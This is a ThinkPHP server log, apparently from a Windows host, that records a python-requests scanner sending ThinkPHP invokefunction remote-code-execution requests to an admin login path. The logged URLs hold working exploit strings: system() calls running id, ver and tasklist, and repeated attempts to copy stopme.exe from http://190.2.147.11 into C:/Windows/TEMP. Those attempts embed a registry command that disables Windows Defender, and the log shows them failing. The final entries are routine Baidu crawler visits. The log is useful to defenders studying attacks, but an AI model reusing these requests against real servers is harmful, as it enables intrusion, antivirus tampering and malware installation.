+[ 2019-01-04T21:39:15+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/https://picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=cmd.exe+-c+%22Reg+add+%22HKEY_LOCAL_MACHINE%5CSOFTWARE%5CPolicies%5CMicrosoft%5CWindows+Defender%22+%2Fv+DisableAntiSpyware+%2Ft+REG_DWORD+%2Fd+1+%2Ff%22http%3A%2F%2F190.2.147.11%2Fstopme.exe&vars[1][]=C%3A%2FWindows%2FTEMP%2FGAWLPNLSYF.exe
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/https://picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=cmd.exe+-c+%22Reg+add+%22HKEY_LOCAL_MACHINE%5CSOFTWARE%5CPolicies%5CMicrosoft%5CWindows+Defender%22+%2Fv+DisableAntiSpyware+%2Ft+REG_DWORD+%2Fd+1+%2Ff%22http%3A%2F%2F190.2.147.11%2Fstopme.exe&vars[1][]=C%3A%2FWindows%2FTEMP%2FGAWLPNLSYF.exe [运行时间：0.093600s][吞吐率：10.68req/s] [内存消耗：1,417.98kb] [文件加载：61]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'copy',
+    1 => 
+    array (
+      0 => 'cmd.exe -c "Reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f"http://190.2.147.11/stopme.exe',
+      1 => 'C:/Windows/TEMP/GAWLPNLSYF.exe',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+[ error ] [2]copy(cmd.exe -c &quot;Reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender&quot; /v DisableAntiSpyware /t REG_DWORD /d 1 /f&quot;http://190.2.147.11/stopme.exe): failed to open stream: Invalid argument[C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php:319]
+---------------------------------------------------------------
+[ 2019-01-04T21:39:20+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/https://picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=cmd.exe+-c+%22Reg+add+%22HKEY_LOCAL_MACHINE%5CSOFTWARE%5CPolicies%5CMicrosoft%5CWindows+Defender%22+%2Fv+DisableAntiSpyware+%2Ft+REG_DWORD+%2Fd+1+%2Ff%22http%3A%2F%2F190.2.147.11%2Fstopme.exe&vars[1][]=C%3A%2FWindows%2FTEMP%2FGAWLPNLSYF.exe%22);
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/https://picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=cmd.exe+-c+%22Reg+add+%22HKEY_LOCAL_MACHINE%5CSOFTWARE%5CPolicies%5CMicrosoft%5CWindows+Defender%22+%2Fv+DisableAntiSpyware+%2Ft+REG_DWORD+%2Fd+1+%2Ff%22http%3A%2F%2F190.2.147.11%2Fstopme.exe&vars[1][]=C%3A%2FWindows%2FTEMP%2FGAWLPNLSYF.exe%22); [运行时间：0.078000s][吞吐率：12.82req/s] [内存消耗：1,418.06kb] [文件加载：61]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'copy',
+    1 => 
+    array (
+      0 => 'cmd.exe -c "Reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f"http://190.2.147.11/stopme.exe',
+      1 => 'C:/Windows/TEMP/GAWLPNLSYF.exe");',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+[ error ] [2]copy(cmd.exe -c &quot;Reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender&quot; /v DisableAntiSpyware /t REG_DWORD /d 1 /f&quot;http://190.2.147.11/stopme.exe): failed to open stream: Invalid argument[C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php:319]
+---------------------------------------------------------------
+[ 2019-01-04T22:13:23+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5CContainer/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=khoroshoTest
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5CContainer/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=khoroshoTest [运行时间：0.078000s][吞吐率：12.82req/s] [内存消耗：1,414.22kb] [文件加载：61]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\Container',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'md5',
+    1 => 
+    array (
+      0 => 'khoroshoTest',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T22:13:37+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=khoroshoTest
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=khoroshoTest [运行时间：0.062400s][吞吐率：16.03req/s] [内存消耗：1,380.38kb] [文件加载：57]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'md5',
+    1 => 
+    array (
+      0 => 'khoroshoTest',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T22:14:06+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id [运行时间：0.187200s][吞吐率：5.34req/s] [内存消耗：1,380.25kb] [文件加载：57]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'system',
+    1 => 
+    array (
+      0 => 'id',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T22:14:12+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ver
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ver [运行时间：0.171601s][吞吐率：5.83req/s] [内存消耗：1,380.27kb] [文件加载：57]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'system',
+    1 => 
+    array (
+      0 => 'ver',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T22:14:23+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=tasklist
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=tasklist [运行时间：0.452400s][吞吐率：2.21req/s] [内存消耗：1,380.37kb] [文件加载：57]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'system',
+    1 => 
+    array (
+      0 => 'tasklist',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T22:17:40+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/https://picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=cmd.exe+-c+%22Reg+add+%22HKEY_LOCAL_MACHINE%5CSOFTWARE%5CPolicies%5CMicrosoft%5CWindows+Defender%22+%2Fv+DisableAntiSpyware+%2Ft+REG_DWORD+%2Fd+1+%2Ff%22http%3A%2F%2F190.2.147.11%2Fstopme.exe&vars[1][]=C%3A%2FWindows%2FTEMP%2FVQMOIZEYPF.exe
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/https://picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=cmd.exe+-c+%22Reg+add+%22HKEY_LOCAL_MACHINE%5CSOFTWARE%5CPolicies%5CMicrosoft%5CWindows+Defender%22+%2Fv+DisableAntiSpyware+%2Ft+REG_DWORD+%2Fd+1+%2Ff%22http%3A%2F%2F190.2.147.11%2Fstopme.exe&vars[1][]=C%3A%2FWindows%2FTEMP%2FVQMOIZEYPF.exe [运行时间：0.093601s][吞吐率：10.68req/s] [内存消耗：1,417.98kb] [文件加载：61]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'copy',
+    1 => 
+    array (
+      0 => 'cmd.exe -c "Reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f"http://190.2.147.11/stopme.exe',
+      1 => 'C:/Windows/TEMP/VQMOIZEYPF.exe',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+[ error ] [2]copy(cmd.exe -c &quot;Reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender&quot; /v DisableAntiSpyware /t REG_DWORD /d 1 /f&quot;http://190.2.147.11/stopme.exe): failed to open stream: Invalid argument[C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php:319]
+---------------------------------------------------------------
+[ 2019-01-04T22:17:43+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/https://picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=cmd.exe+-c+%22Reg+add+%22HKEY_LOCAL_MACHINE%5CSOFTWARE%5CPolicies%5CMicrosoft%5CWindows+Defender%22+%2Fv+DisableAntiSpyware+%2Ft+REG_DWORD+%2Fd+1+%2Ff%22http%3A%2F%2F190.2.147.11%2Fstopme.exe&vars[1][]=C%3A%2FWindows%2FTEMP%2FVQMOIZEYPF.exe%22);
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/https://picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=cmd.exe+-c+%22Reg+add+%22HKEY_LOCAL_MACHINE%5CSOFTWARE%5CPolicies%5CMicrosoft%5CWindows+Defender%22+%2Fv+DisableAntiSpyware+%2Ft+REG_DWORD+%2Fd+1+%2Ff%22http%3A%2F%2F190.2.147.11%2Fstopme.exe&vars[1][]=C%3A%2FWindows%2FTEMP%2FVQMOIZEYPF.exe%22); [运行时间：0.078000s][吞吐率：12.82req/s] [内存消耗：1,418.06kb] [文件加载：61]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'copy',
+    1 => 
+    array (
+      0 => 'cmd.exe -c "Reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f"http://190.2.147.11/stopme.exe',
+      1 => 'C:/Windows/TEMP/VQMOIZEYPF.exe");',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+[ error ] [2]copy(cmd.exe -c &quot;Reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender&quot; /v DisableAntiSpyware /t REG_DWORD /d 1 /f&quot;http://190.2.147.11/stopme.exe): failed to open stream: Invalid argument[C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php:319]
+---------------------------------------------------------------
+[ 2019-01-04T22:40:28+08:00 ] 123.125.71.32 GET /relaxed/public/index.php/admin/index/login
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login [运行时间：0.124801s][吞吐率：8.01req/s] [内存消耗：2,212.80kb] [文件加载：80]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'index',
+    2 => 'login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'close',
+  'accept' => '*/*',
+  'if-none-match' => '""""""""""""@NULL@""""""""""""',
+  'accept-language' => 'zh-cn,zh-tw',
+  'user-agent' => 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/admin\lang\zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.015600s ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/admin/lang/zh-cn/index.php
+[ info ] [ RUN ] app\admin\controller\Index->login[ C:\PhpStudy\PHPTutorial\WWW\relaxed\application\admin\controller\Index.php ]
+[ info ] [ BEHAVIOR ] Run \addons\loginbg\Loginbg @admin_login_init [ RunTime:0.000000s ]
+[ info ] [ VIEW ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/admin\view\index\login.html [ array (
+  0 => 'breadcrumb',
+  1 => 'site',
+  2 => 'config',
+  3 => 'auth',
+  4 => 'admin',
+  5 => 'background',
+  6 => 'title',
+) ]
+[ info ] [ BEHAVIOR ] Run app\admin\behavior\AdminLog @app_end [ RunTime:0.000000s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T22:40:31+08:00 ] 111.206.198.4 GET /relaxed/public/index.php/admin/ajax/lang?callback=define&controllername=index&v=1546612828
+[ info ] picc.18178.net/relaxed/public/index.php/admin/ajax/lang?callback=define&controllername=index&v=1546612828 [运行时间：0.109200s][吞吐率：9.16req/s] [内存消耗：2,217.99kb] [文件加载：79]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'ajax',
+    2 => 'lang',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'close',
+  'referer' => 'http://picc.18178.net/relaxed/public/index.php/admin/index/login',
+  'accept' => '*/*',
+  'resource-type' => '3',
+  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
+  'x-devtools-emulate-network-conditions-client-id' => '83793eec-e4dc-4dec-a933-4faf4e75a0e7',
+  'proxy-connection' => 'keep-alive',
+  'user-agent' => 'Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'callback' => 'define',
+  'controllername' => 'index',
+  'v' => '1546612828',
+)
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/admin\lang\zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/admin/lang/zh-cn/ajax.php
+[ info ] [ RUN ] app\admin\controller\Ajax->lang[ C:\PhpStudy\PHPTutorial\WWW\relaxed\application\admin\controller\Ajax.php ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/admin/lang/zh-cn/index.php
+[ info ] [ BEHAVIOR ] Run app\admin\behavior\AdminLog @app_end [ RunTime:0.015600s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T22:40:49+08:00 ] 111.206.221.51 GET /relaxed/public/index.php/admin/ajax/lang?callback=define&controllername=index&v=1546612828
+[ info ] picc.18178.net/relaxed/public/index.php/admin/ajax/lang?callback=define&controllername=index&v=1546612828 [运行时间：0.109200s][吞吐率：9.16req/s] [内存消耗：2,218.50kb] [文件加载：79]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'ajax',
+    2 => 'lang',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'close',
+  'referer' => 'http://picc.18178.net/relaxed/public/index.php/admin/index/login',
+  'accept' => '*/*',
+  'resource-type' => '3',
+  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
+  'x-devtools-emulate-network-conditions-client-id' => 'a7482b8b-2e75-4de5-8209-792df3589b67',
+  'proxy-connection' => 'keep-alive',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'callback' => 'define',
+  'controllername' => 'index',
+  'v' => '1546612828',
+)
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/admin\lang\zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/admin/lang/zh-cn/ajax.php
+[ info ] [ RUN ] app\admin\controller\Ajax->lang[ C:\PhpStudy\PHPTutorial\WWW\relaxed\application\admin\controller\Ajax.php ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/admin/lang/zh-cn/index.php
+[ info ] [ BEHAVIOR ] Run app\admin\behavior\AdminLog @app_end [ RunTime:0.000000s ]
+[ info ] [ LOG ] INIT File
